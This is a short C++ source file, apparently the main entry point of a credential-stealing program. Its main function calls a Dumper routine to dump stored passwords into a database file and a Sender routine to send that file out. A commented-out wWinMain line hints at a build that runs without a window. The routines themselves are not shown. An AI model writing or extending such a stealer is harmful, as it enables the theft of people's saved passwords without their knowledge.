#include "Main.h"


//int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
int main()
{
	string dbPath = Dumper::dumpPassword();
	Sender::sendPasswords(dbPath);
	return 0;
}